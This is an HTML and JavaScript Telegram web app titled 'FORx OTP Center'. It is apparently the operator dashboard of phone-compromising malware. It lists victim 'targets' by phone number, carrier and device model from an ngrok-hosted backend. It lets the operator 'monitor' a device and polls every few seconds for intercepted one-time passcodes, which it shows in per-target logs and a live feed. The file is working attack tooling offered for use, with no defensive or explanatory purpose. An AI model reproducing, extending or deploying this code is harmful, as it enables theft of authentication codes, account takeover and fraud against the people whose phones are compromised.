<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FORx OTP Center</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:sans-serif; margin:0; padding:15px; }
        .tabs { display:flex; gap:5px; margin-bottom:10px; }
        .tab { flex:1; padding:12px; background:#1e1e1e; text-align:center; border-radius:8px 8px 0 0; cursor:pointer; font-weight:bold; }
        .tab.active { background:#2ecc71; color:#000; }
        .panel { display:none; }
        .panel.active { display:block; }

        .card { background:#1e1e1e; border-radius:12px; padding:15px; margin:10px 0; transition:all 0.3s ease; }
        .card.monitoring { border:1px solid #2ecc71; }
        .card-header { display:flex; justify-content:space-between; align-items:center; }
        .phone-info { flex:1; }
        .phone-info b { font-size:18px; }
        .phone-info small { color:#aaa; }

        .monitor-btn { background:#2ecc71; color:#000; border:none; padding:10px 18px; border-radius:8px; font-weight:bold; cursor:pointer; font-size:14px; }
        .monitor-btn.stop { background:#e74c3c; }
        .fav-btn { background:#f39c12; color:#000; border:none; padding:8px; border-radius:6px; cursor:pointer; margin-right:5px; }

        .monitor-view {
            display:none;
            margin-top:15px;
            background:#1a2634;
            border-radius:10px;
            padding:15px;
            border:1px solid #2ecc71;
        }
        .monitor-view.active { display:block; }
        .target-header {
            display:flex; align-items:center; gap:10px; margin-bottom:10px;
            background:#0f1923; padding:10px; border-radius:8px;
        }
        .target-header span { font-size:20px; font-weight:bold; color:#2ecc71; }
        .copy-btn { background:#3498db; color:#fff; border:none; padding:6px 12px; border-radius:6px; cursor:pointer; font-size:13px; }

        .otp-log {
            background:#0d1117; min-height:200px; max-height:400px;
            overflow-y:auto; padding:12px; border-radius:8px; margin-bottom:10px;
        }
        .otp-entry {
            background:#161b22; padding:10px; margin:8px 0; border-radius:6px;
            border-left:4px solid #2ecc71; font-size:13px;
        }
        .otp-entry .time { color:#58a6ff; font-size:12px; }

        .actions { display:flex; gap:10px; justify-content:flex-end; }
        .btn-clear { background:#e67e22; color:#000; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; font-weight:bold; }
        .btn-close { background:#95a5a6; color:#000; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; font-weight:bold; }

        #feed { height:350px; overflow-y:auto; background:#111; border-radius:8px; padding:8px; }
        input, button { font-size:14px; }
    </style>
</head>
<body>
    <div class="tabs">
        <div class="tab active" onclick="switchTab('targets')">🎯 Targets</div>
        <div class="tab" onclick="switchTab('favourites')">⭐ Favourites</div>
        <div class="tab" onclick="switchTab('feed')">⚡ Live Feed</div>
    </div>

    <div id="targets-panel" class="panel active">
        <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()" style="width:100%;padding:10px;border-radius:6px;border:none;margin-bottom:10px;background:#2c3e50;color:#eee;">
        <div id="targets-list"></div>
    </div>
    <div id="favourites-panel" class="panel">
        <button onclick="loadFavourites()" style="margin-bottom:10px;background:#2ecc71;color:#000;border:none;padding:10px;border-radius:6px;font-weight:bold;">🔄 Refresh</button>
        <div id="favourites-list"></div>
    </div>
    <div id="feed-panel" class="panel">
        <div id="feed"><p>No OTPs yet...</p></div>
    </div>

    <script>
        // ========== CONFIG ==========
        const API = 'https://limit-crispness-uncork.ngrok-free.dev';
        const tg = Telegram.WebApp; tg.ready();
        let userId = tg.initDataUnsafe?.user?.id || null;
        if (!userId) {
            const params = new URLSearchParams(window.location.search);
            userId = params.get('user_id');
        }
        if (!userId) {
            document.body.innerHTML = '<p style="color:red;">❌ Could not get user ID. Please open via bot.</p>';
            throw new Error('No user ID');
        }

        const HEADERS = { 'ngrok-skip-browser-warning': 'true', 'Content-Type': 'application/json' };
        let allTargets = [];
        // Per‑device monitor state: did -> { active:bool, phone:string, startTime:number, lastOtpTs:number, intervalId:number, otpLog:array<string> }
        let monitors = {};

        // Tab switching
        window.switchTab = (tab) => {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.getElementById(tab+'-panel').classList.add('active');
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            if (tab === 'targets') loadTargets();
            if (tab === 'favourites') loadFavourites();
        };

        // ========== TARGETS ==========
        async function loadTargets() {
            try {
                let res = await fetch(`${API}/api/targets`, { headers: HEADERS });
                if (!res.ok) throw new Error('HTTP ' + res.status);
                allTargets = await res.json();
                renderTargets(allTargets);
            } catch(e) {
                document.getElementById('targets-list').innerHTML = '<p style="color:red;">Failed to load targets.</p>';
            }
        }

        function renderTargets(targets) {
            let html = targets.length ? '' : '<p>No online targets. Scanner may be warming up.</p>';
            targets.forEach(t => {
                let carrier = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
                html += `
                <div class="card" id="card-${t.did}">
                    <div class="card-header">
                        <div class="phone-info">
                            <b>${t.phone1}</b>${carrier}<br>
                            <small>${t.model} | DB-${t.db_index}</small>
                        </div>
                        <div>
                            <button class="fav-btn" onclick="toggleFavourite('${t.did}')">⭐</button>
                            <button class="monitor-btn" id="monitor-btn-${t.did}" onclick="toggleMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}')">▶️ MONITOR</button>
                        </div>
                    </div>
                    <!-- Expandable Monitor View -->
                    <div class="monitor-view" id="monitor-view-${t.did}">
                        <div class="target-header">
                            <span>🎯 TARGET: ${t.phone1}</span>
                            <button class="copy-btn" onclick="copyText('${t.phone1}')">📋 Copy</button>
                        </div>
                        <div class="otp-log" id="otp-log-${t.did}"></div>
                        <div class="actions">
                            <button class="btn-clear" onclick="clearOTPs('${t.did}')">🧹 Clear</button>
                            <button class="monitor-btn stop" id="stop-btn-${t.did}" onclick="toggleMonitor('${t.did}')">⏹ STOP</button>
                            <button class="btn-close" onclick="closeMonitor('${t.did}')">✖ Close</button>
                        </div>
                    </div>
                </div>`;
            });
            document.getElementById('targets-list').innerHTML = html;
            // Restore any active monitors
            for (let did in monitors) {
                let monitor = monitors[did];
                if (monitor.active) {
                    let view = document.getElementById('monitor-view-'+did);
                    let btn = document.getElementById('monitor-btn-'+did);
                    let card = document.getElementById('card-'+did);
                    if (view && btn && card) {
                        view.classList.add('active');
                        card.classList.add('monitoring');
                        btn.innerHTML = '⏹ STOP';
                        btn.classList.add('stop');
                        // Re‑populate OTP log
                        document.getElementById('otp-log-'+did).innerHTML = monitor.otpLog.join('');
                    }
                }
            }
        }

        window.filterTargets = function() {
            let query = document.getElementById('search').value.toLowerCase();
            let filtered = allTargets.filter(t => t.phone1.includes(query));
            renderTargets(filtered);
        };

        // ========== MONITOR TOGGLE ==========
        window.toggleMonitor = async function(did, dbIndex, phone, model) {
            // If no monitor object, create and start
            if (!monitors[did]) {
                await startMonitoring(did, dbIndex, phone, model);
                return;
            }
            let monitor = monitors[did];
            if (!monitor.active) {
                // Resume / restart monitoring
                await startMonitoring(did, dbIndex, phone, model);
            } else {
                // Stop monitoring (keep view open)
                await stopMonitoring(did, false);
            }
        };

        async function startMonitoring(did, dbIndex, phone, model) {
            // Cancel existing if any
            if (monitors[did]?.active) {
                await stopMonitoring(did, true); // silent stop, keep UI
            }
            let startTime = Date.now() / 1000;
            await fetch(`${API}/api/monitor`, {
                method: 'POST', headers: HEADERS,
                body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1: phone, model })
            });
            monitors[did] = {
                active: true,
                phone: phone,
                startTime: startTime,
                lastOtpTs: startTime,
                intervalId: null,
                otpLog: []   // array of HTML strings
            };
            updateMonitorUI(did, true);
            startDevicePolling(did);
        }

        async function stopMonitoring(did, keepView) {
            if (!monitors[did]?.active) return;
            await fetch(`${API}/api/monitor`, {
                method: 'DELETE', headers: HEADERS,
                body: JSON.stringify({ user_id: userId, did })
            });
            if (monitors[did].intervalId) {
                clearInterval(monitors[did].intervalId);
                monitors[did].intervalId = null;
            }
            monitors[did].active = false;
            if (!keepView) {
                updateMonitorUI(did, false);
            } else {
                // just update button state
                let btn = document.getElementById('monitor-btn-'+did);
                if (btn) { btn.innerHTML = '▶️ MONITOR'; btn.classList.remove('stop'); }
            }
        }

        function updateMonitorUI(did, active) {
            let btn = document.getElementById('monitor-btn-'+did);
            let view = document.getElementById('monitor-view-'+did);
            let card = document.getElementById('card-'+did);
            if (active) {
                if (btn) { btn.innerHTML = '⏹ STOP'; btn.classList.add('stop'); }
                if (view) view.classList.add('active');
                if (card) card.classList.add('monitoring');
            } else {
                if (btn) { btn.innerHTML = '▶️ MONITOR'; btn.classList.remove('stop'); }
                // Keep view open so user can see past OTPs
            }
        }

        function startDevicePolling(did) {
            if (monitors[did]?.intervalId) return;
            // Immediate first poll
            pollDevice(did);
            monitors[did].intervalId = setInterval(() => pollDevice(did), 3000);
        }

        async function pollDevice(did) {
            let monitor = monitors[did];
            if (!monitor || !monitor.active) return;
            try {
                let res = await fetch(`${API}/api/otp/${userId}?since=${monitor.lastOtpTs}`, { headers: HEADERS });
                if (!res.ok) return;
                let msgs = await res.json();
                if (msgs.length) {
                    let logDiv = document.getElementById('otp-log-'+did);
                    msgs.forEach(m => {
                        // Only show messages that arrived after monitoring started
                        if (m.ts >= monitor.startTime) {
                            let timeStr = new Date(m.ts * 1000).toLocaleTimeString();
                            let displayText = m.text.replace(/\n/g, '<br>');
                            let entry = `<div class="otp-entry"><span class="time">${timeStr}</span><br>${displayText}</div>`;
                            monitor.otpLog.push(entry);
                            if (logDiv) {
                                logDiv.innerHTML += entry;
                                logDiv.scrollTop = logDiv.scrollHeight;
                            }
                        }
                        if (m.ts > monitor.lastOtpTs) monitor.lastOtpTs = m.ts;
                    });
                }
            } catch(e) { console.error('Poll error:', e); }
        }

        // Close monitor view completely and stop
        window.closeMonitor = async function(did) {
            if (monitors[did]?.active) {
                await fetch(`${API}/api/monitor`, {
                    method: 'DELETE', headers: HEADERS,
                    body: JSON.stringify({ user_id: userId, did })
                });
            }
            if (monitors[did]?.intervalId) clearInterval(monitors[did].intervalId);
            delete monitors[did];
            let view = document.getElementById('monitor-view-'+did);
            let btn = document.getElementById('monitor-btn-'+did);
            let card = document.getElementById('card-'+did);
            if (view) view.classList.remove('active');
            if (btn) { btn.innerHTML = '▶️ MONITOR'; btn.classList.remove('stop'); }
            if (card) card.classList.remove('monitoring');
            document.getElementById('otp-log-'+did).innerHTML = '';
        };

        // Clear OTP log for a device
        window.clearOTPs = function(did) {
            if (monitors[did]) {
                monitors[did].otpLog = [];
            }
            let logDiv = document.getElementById('otp-log-'+did);
            if (logDiv) logDiv.innerHTML = '';
        };

        // ========== FAVOURITES ==========
        async function loadFavourites() {
            try {
                let res = await fetch(`${API}/api/favourites/${userId}`, { headers: HEADERS });
                if (!res.ok) throw new Error('Failed');
                let favs = await res.json();
                let html = '';
                if (favs.length === 0) html = '<p>No favourites.</p>';
                else {
                    favs.forEach(f => {
                        html += `<div class="card">
                            <div class="card-header">
                                <div class="phone-info"><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
                                <button class="monitor-btn" onclick="toggleMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️ MONITOR</button>
                            </div>
                        </div>`;
                    });
                }
                document.getElementById('favourites-list').innerHTML = html;
            } catch(e) {
                document.getElementById('favourites-list').innerHTML = '<p style="color:red;">Error loading favourites.</p>';
            }
        }

        window.addFavourite = async function(did, phone1, phone2, car1, car2, model, dbIndex) {
            await fetch(`${API}/api/favourites/${userId}`, {
                method: 'POST', headers: HEADERS,
                body: JSON.stringify({ did, phone1, phone2, carrier1:car1, carrier2:car2, model, db_index:dbIndex })
            });
            tg.showAlert('Added to favourites');
        };

        window.removeFavourite = async function(did) {
            await fetch(`${API}/api/favourites/${userId}`, {
                method: 'DELETE', headers: HEADERS,
                body: JSON.stringify({ did })
            });
            loadFavourites();
        };

        // ========== HELPERS ==========
        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => tg.showAlert('Copied!'));
        }

        // Initial load
        loadTargets();
        setInterval(loadTargets, 30000);
    </script>
</body>
</html>
